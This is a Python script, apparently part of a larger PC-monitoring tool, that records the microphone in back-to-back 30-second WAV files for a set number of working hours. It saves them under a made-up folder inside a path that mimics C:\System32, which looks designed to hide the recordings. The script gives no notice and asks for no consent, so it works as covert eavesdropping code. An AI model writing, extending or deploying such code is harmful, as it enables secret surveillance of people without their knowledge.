import pyaudio
import wave
import time
from PC.conf_record import working_hours

CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 2
RATE = 44100
RECORD_SECONDS = 30  # time span for one segment
WAVE_OUTPUT_FILENAME = r"C:\System32\x6dx21x6q\output_vol"  # audio file name


def sound_mic():
    """
    listening and saving sound
    """
    start_time = time.time()
    nom_name = 1
    while start_time + working_hours > time.time():
        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        print("* recording")

        frames = []

        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        print("* done recording")

        stream.stop_stream()
        stream.close()
        p.terminate()

        wf = wave.open(WAVE_OUTPUT_FILENAME + f"{nom_name}.wav", 'wb')

        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        nom_name += 1
